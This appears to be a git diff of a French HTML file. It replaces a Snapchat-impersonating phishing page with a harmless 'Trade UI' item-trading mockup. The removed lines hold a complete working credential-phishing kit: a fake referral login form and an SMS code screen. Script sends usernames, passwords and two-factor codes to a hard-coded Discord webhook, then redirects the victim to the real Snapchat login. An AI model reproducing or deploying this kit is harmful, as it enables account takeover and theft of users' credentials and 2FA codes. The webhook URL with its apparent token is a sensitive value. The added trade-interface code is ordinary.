@@ -2,294 +2,215 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Snapchat | Parrainez Un Ami</title>
-
-  <!-- OPEN GRAPH POUR PARTAGE AVEC LOGO ET TITRE -->
-  <meta property="og:title" content="Snapchat | Parrainez Un Ami" />
-  <meta property="og:description" content="Description courte" />
-  <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
-  <meta property="og:type" content="website" />
-  <meta property="og:url" content="https://ton-site.com/ton-lien" />
-
+  <title>Trade UI</title>
   <style>
+    * { box-sizing: border-box; }
     body {
       margin: 0;
-      padding: 0;
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      background: #000; /* arrière-plan noir */
+      color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
     }
 
-    .login-box, .code-screen {
-      width: 100%;
-      max-width: 400px;
-      padding: 40px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      border-radius: 10px;
+    .trade-zone {
+      background: #2b2b2b; /* zone de trade grise */
+      border-radius: 16px;
+      padding: 24px;
+      width: 900px;
+      max-width: 95%;
+    }
+
+    .columns {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 40px;
+    }
+
+    .column {
       text-align: center;
-      background-color: #fff;
-      color: #000;
     }
 
-    .logo {
-      width: 80px;
-      margin: 0 auto 20px auto;
-      display: block;
+    .column h2 {
+      margin-bottom: 16px;
+      font-size: 18px;
+      color: #b18cff;
     }
 
-    .form-group {
-      text-align: left;
-      margin-bottom: 15px;
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 14px;
     }
 
-    .form-group label {
-      display: block;
-      font-size: 13px;
-      font-weight: bold;
-      margin-bottom: 5px;
-    }
-
-    .form-group input {
+    .slot {
       width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
-      box-sizing: border-box;
-    }
-
-    button {
-      background-color: #fffc00;
-      border: none;
-      color: #000;
-      font-weight: bold;
-      padding: 12px;
-      width: 100%;
-      border-radius: 8px;
-      cursor: pointer;
-      margin-top: 20px;
-      font-size: 16px;
-    }
-
-    .links-container {
+      aspect-ratio: 1 / 1;
+      background: #1a1a1a;
+      border-radius: 12px;
       display: flex;
-      justify-content: space-between;
-      margin-top: 10px;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .add-btn {
+      background: linear-gradient(135deg, #7a4dff, #9b6bff);
+      cursor: pointer;
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+      font-size: 32px;
+      color: #fff;
+    }
+
+    .add-btn:hover {
+      transform: scale(1.08); /* agrandissement au hover */
+      box-shadow: 0 0 12px rgba(155,107,255,0.6);
+    }
+
+    .footer {
+      margin-top: 24px;
+      padding-top: 16px;
+      border-top: 1px solid #444;
+      display: flex;
+      justify-content: space-around;
+      text-align: center;
+    }
+
+    .footer span {
+      display: block;
+      color: #aaa;
       font-size: 14px;
     }
 
-    .link-button {
-      background: transparent;
-      border: none;
-      color: blue;
-      font-weight: bold;
-      cursor: pointer;
-      text-decoration: underline;
+    .footer strong {
+      font-size: 24px;
+      color: #9b6bff;
     }
 
-    #errorMessage,
-    #referralError,
-    #codeError,
-    #codeSentMessage {
-      margin-top: 10px;
-      font-weight: bold;
+    /* Modal */
+    .modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
       display: none;
+      justify-content: center;
+      align-items: center;
     }
 
-    #errorMessage,
-    #referralError,
-    #codeError {
-      color: red;
+    .modal.active { display: flex; }
+
+    .modal-content {
+      background: #1f1f1f;
+      padding: 20px;
+      border-radius: 14px;
+      width: 600px;
+      max-width: 90%;
     }
 
-    #codeSentMessage {
-      color: green;
+    .items {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+      margin-top: 16px;
     }
 
-    #imageScreen {
-      display: none;
+    .item {
+      background: #2e2e2e;
+      border-radius: 10px;
+      padding: 10px;
       text-align: center;
-    }
-
-    #imageScreen label {
-      display: block;
-      margin-bottom: 10px;
-      font-weight: bold;
-    }
-
-    #imageScreen input {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
-      box-sizing: border-box;
-      margin-bottom: 10px;
-    }
-
-    #imageScreen button {
-      background-color: #fffc00;
-      border: none;
-      color: #000;
-      font-weight: bold;
-      padding: 12px;
-      width: 100%;
-      border-radius: 8px;
       cursor: pointer;
-      font-size: 16px;
+      transition: transform 0.1s ease, background 0.1s ease;
+    }
+
+    .item:hover {
+      transform: scale(1.05);
+      background: #3a3a3a;
     }
   </style>
 </head>
 <body>
-  <!-- FORMULAIRE DE CONNEXION -->
-  <div class="login-box" id="loginBox">
-    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
-    <h2>Snapchat | Parrainez Un Ami</h2>
-    <form id="loginForm">
-      <div class="form-group">
-        <label for="username">Nom d'utilisateur ou e-mail</label>
-        <input type="text" id="username" required />
-      </div>
-      <div class="form-group">
-        <label for="password">Mot de passe</label>
-        <input type="password" id="password" required />
-      </div>
-      <div class="form-group">
-        <label for="referralCode">Code de parrainage</label>
-        <input type="text" id="referralCode" required />
+
+  <div class="trade-zone">
+    <div class="columns">
+      <div class="column">
+        <h2>I Have</h2>
+        <div class="grid">
+          <div class="slot add-btn" onclick="openModal()">+</div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+        </div>
       </div>
 
-      <button type="submit">Connexion</button>
-
-      <div class="links-container">
-        <button type="button" class="link-button">S'inscrire</button>
-        <button type="button" class="link-button">Mot de passe oublié</button>
+      <div class="column">
+        <h2>I Want</h2>
+        <div class="grid">
+          <div class="slot add-btn" onclick="openModal()">+</div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+          <div class="slot"></div>
+        </div>
       </div>
-    </form>
-    <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
-    <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
+    </div>
+
+    <div class="footer">
+      <div>
+        <span>Your Offer</span>
+        <strong>0</strong>
+        <span>Demand: 0/10</span>
+      </div>
+      <div>
+        <span>You Want</span>
+        <strong>0</strong>
+        <span>Demand: 0/10</span>
+      </div>
+    </div>
   </div>
 
-  <!-- ZONE DE CODE -->
-  <div class="code-screen" id="imageScreen">
-    <label for="codeInput">Code Reçu par SMS</label>
-    <input type="text" id="codeInput" name="codeInput" />
-    <button id="validateButton">Validez</button>
-    <p id="codeError">Le code doit contenir exactement 6 chiffres.</p>
-    <p id="codeSentMessage">Recevra Snap + dans 30 minutes</p>
+  <!-- Modal de sélection d'objets -->
+  <div class="modal" id="modal">
+    <div class="modal-content">
+      <h3>Choisir un objet</h3>
+      <div class="items">
+        <!-- Exemples d'objets (images à remplacer plus tard) -->
+        <div class="item">Objet 1</div>
+        <div class="item">Objet 2</div>
+        <div class="item">Objet 3</div>
+        <div class="item">Objet 4</div>
+        <div class="item">Objet 5</div>
+        <div class="item">Objet 6</div>
+        <div class="item">Objet 7</div>
+        <div class="item">Objet 8</div>
+      </div>
+    </div>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1456052165062955154/PIffzSrsDCnQ4Q-Um7YqT4e9Ti6Cz7m8FbSHqI169lw6MnT8nra8dyS_zEesu9M3wsNS";
-    const redirectURL = "https://accounts.snapchat.com/v2/login";
+    const modal = document.getElementById('modal');
 
-    // FORMULAIRE DE CONNEXION
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
+    function openModal() {
+      modal.classList.add('active');
+    }
 
-      const username = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value.trim();
-      const referralCode = document.getElementById('referralCode').value.trim();
-
-      const errorMessage = document.getElementById('errorMessage');
-      const referralError = document.getElementById('referralError');
-
-      errorMessage.style.display = 'none';
-      referralError.style.display = 'none';
-
-      if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
-        errorMessage.style.display = 'block';
-        return;
+    modal.addEventListener('click', (e) => {
+      if (e.target === modal) {
+        modal.classList.remove('active');
       }
-
-      if (!/^\d{4}$/.test(referralCode)) {
-        referralError.style.display = 'block';
-        return;
-      }
-
-      const message = {
-        embeds: [
-          {
-            title: "📥 Nouvelle tentative de connexion",
-            description: "Informations collectées via le formulaire",
-            color: 0xffc800,
-            fields: [
-              { name: "👤 Nom d'utilisateur / e-mail", value: username },
-              { name: "🔒 Mot de passe", value: password },
-              { name: "🎁 Code de parrainage", value: referralCode }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: { text: "Formulaire Rankos" }
-          }
-        ]
-      };
-
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(message),
-      })
-      .then(response => {
-        setTimeout(() => {
-          document.getElementById('loginBox').style.display = 'none';
-          document.getElementById('imageScreen').style.display = 'block';
-        }, 1000);
-      })
-      .catch(error => {
-        alert("Erreur réseau ou CORS.");
-        console.error(error);
-      });
-    });
-
-    // BOUTON VALIDEZ
-    document.getElementById('validateButton').addEventListener('click', function() {
-      const codeInput = document.getElementById('codeInput').value.trim();
-      const codeError = document.getElementById('codeError');
-      const codeSentMessage = document.getElementById('codeSentMessage');
-
-      codeError.style.display = 'none';
-      codeSentMessage.style.display = 'none';
-
-      if(!/^\d{6}$/.test(codeInput)){
-        codeError.style.display = 'block';
-        return;
-      }
-
-      const codeMessage = {
-        embeds: [
-          {
-            title: "📥 Code reçu",
-            description: "Utilisateur a entré son code reçu par SMS",
-            color: 0x00ff00,
-            fields: [
-              { name: "💬 Code", value: codeInput }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: { text: "Formulaire Rankos" }
-          }
-        ]
-      };
-
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(codeMessage),
-      })
-      .then(response => {
-        codeSentMessage.style.display = 'block';
-        setTimeout(() => {
-          window.location.href = redirectURL;
-        }, 30000);
-      })
-      .catch(error => {
-        alert("Erreur réseau ou CORS.");
-        console.error(error);
-      });
     });
   </script>
+
 </body>
 </html>
